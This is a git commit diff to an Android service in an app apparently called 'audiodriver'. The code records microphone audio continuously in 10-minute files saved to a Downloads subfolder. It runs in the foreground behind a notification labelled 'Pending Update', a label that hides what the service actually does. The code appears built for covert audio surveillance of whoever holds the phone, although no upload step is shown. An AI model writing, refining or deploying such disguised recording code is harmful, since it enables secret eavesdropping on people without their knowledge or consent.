4eaa8595ea96c2979c37387fa03fb942db566784
Waheedullah Khan <waheedullahkhan1250@gmail.com>
2025-03-24 14:11:10 +0500

    enhance audio recording functionality and improve directory management

--- app/src/main/java/com/freedom/audiodriver/service/MainService.kt
+++ app/src/main/java/com/freedom/audiodriver/service/MainService.kt
@@ -13,6 +13,7 @@ import android.media.MediaRecorder
 import android.os.Build
 import android.os.Environment
 import android.os.IBinder
+import android.util.Log
 import androidx.core.app.ActivityCompat
 import androidx.core.app.NotificationCompat
 import com.freedom.audiodriver.R
@@ -24,8 +25,10 @@ import java.io.File
 
 class MainService : Service() {
 
+    private val recDirName: String = "AudioRec"
     val sampleRate: Int = 48000
     val bitRate: Int = 64000
+    val duration: Int = 600 // 10 minutes in seconds
 
     var isRecording: Boolean = false
 
@@ -63,73 +66,99 @@ class MainService : Service() {
     }
 
     private fun start() {
-        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("Pending Update")
-            .setSmallIcon(R.drawable.ic_launcher_foreground)
-            .build()
+        try {
+            val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
+                .setContentTitle("Pending Update")
+                .setSmallIcon(R.drawable.ic_launcher_foreground)
+                .build()
 
-        startForeground(1, notification)
+            startForeground(1, notification)
 
-        if (ActivityCompat.checkSelfPermission(
-                this,
-                Manifest.permission.RECORD_AUDIO
-            ) != PackageManager.PERMISSION_GRANTED
-        ) {
+            if (ActivityCompat.checkSelfPermission(
+                    this,
+                    Manifest.permission.RECORD_AUDIO
+                ) != PackageManager.PERMISSION_GRANTED
+            ) {
+                stopSelf()
+                return
+            }
+
+            val mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                MediaRecorder(this).apply {
+                    setAudioSource(MediaRecorder.AudioSource.MIC)
+                    setOutputFormat(MediaRecorder.OutputFormat.OGG)
+                    setAudioEncoder(MediaRecorder.AudioEncoder.OPUS)
+                }
+            } else {
+                MediaRecorder().apply {
+                    setAudioSource(MediaRecorder.AudioSource.MIC)
+                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
+                }
+            }
+
+            isRecording = true
+            CoroutineScope(Dispatchers.IO).launch {
+                try {
+                    val downloadsDir = Environment.getExternalStoragePublicDirectory(
+                        Environment.DIRECTORY_DOWNLOADS
+                    )
+                    val audioRecDir = File(downloadsDir, recDirName)
+
+                    var fileName: String
+
+                    if (!audioRecDir.exists()) {
+                        if (!audioRecDir.mkdirs()) {
+                            Log.e("MainService", "Failed to create directory")
+                            stopSelf()
+                        }
+                    }
+
+                    mediaRecorder.setAudioSamplingRate(sampleRate)
+                    mediaRecorder.setAudioEncodingBitRate(bitRate)
+                    mediaRecorder.setMaxDuration(duration * 1000)
+
+                    while (isRecording) {
+                        fileName = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                            "audio-${System.currentTimeMillis()}.ogg"
+                        } else {
+                            "audio-${System.currentTimeMillis()}.mp4"
+                        }
+
+                        val outputFile = File(audioRecDir, fileName)
+                        mediaRecorder.setOutputFile(outputFile.absolutePath)
+
+                        mediaRecorder.prepare()
+                        mediaRecorder.start()
+
+                        // Wait for 10 minutes or until stopped
+                        var elapsedTime = 0
+                        while (isRecording && elapsedTime < duration * 1000) {
+                            Thread.sleep(1000)
+                            elapsedTime += 1000
+                        }
+
+                        mediaRecorder.apply {
+                            stop()
+                            reset()
+                        }
+
+                        if (!isRecording) break
+                    }
+                } catch (e: Exception) {
+                    Log.e("MainService", "Error while recording -> ${Log.getStackTraceString(e)}")
+                } finally {
+                    mediaRecorder.release()
+                    stopSelf()
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(
+                "MainService",
+                "Error while initializing -> ${Log.getStackTraceString(e)}"
+            )
             stopSelf()
             return
-        }
-
-        isRecording = true
-        CoroutineScope(Dispatchers.IO).launch {
-            while (isRecording) {
-                val fileName: String
-                val downloadsDir = Environment.getExternalStoragePublicDirectory(
-                    Environment.DIRECTORY_DOWNLOADS
-                )
-
-                val mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
-                    MediaRecorder(this@MainService).apply {
-                        setOutputFormat(MediaRecorder.OutputFormat.OGG)
-                        setAudioEncoder(MediaRecorder.AudioEncoder.OPUS)
-
-                        fileName = "audio-${System.currentTimeMillis()}.ogg"
-                    }
-                } else {
-                    MediaRecorder().apply {
-                        setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
-                        setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
-
-                        fileName = "audio-${System.currentTimeMillis()}.m4a"
-                    }
-                }
-
-                mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC)
-                mediaRecorder.setAudioSamplingRate(sampleRate)
-                mediaRecorder.setAudioEncodingBitRate(bitRate)
-                mediaRecorder.setMaxDuration(600000) // 10 minutes in milliseconds
-
-                val outputFile = File(downloadsDir, fileName)
-                mediaRecorder.setOutputFile(outputFile.absolutePath)
-
-                mediaRecorder.prepare()
-                mediaRecorder.start()
-
-                // Wait for 10 minutes or until stopped
-                var elapsedTime = 0
-                while (isRecording && elapsedTime < 600000) {
-                    Thread.sleep(1000)
-                    elapsedTime += 1000
-                }
-
-                mediaRecorder.apply {
-                    stop()
-                    reset()
-                    release()
-                }
-
-                if (!isRecording) break
-            }
-            stopSelf()
         }
     }
 
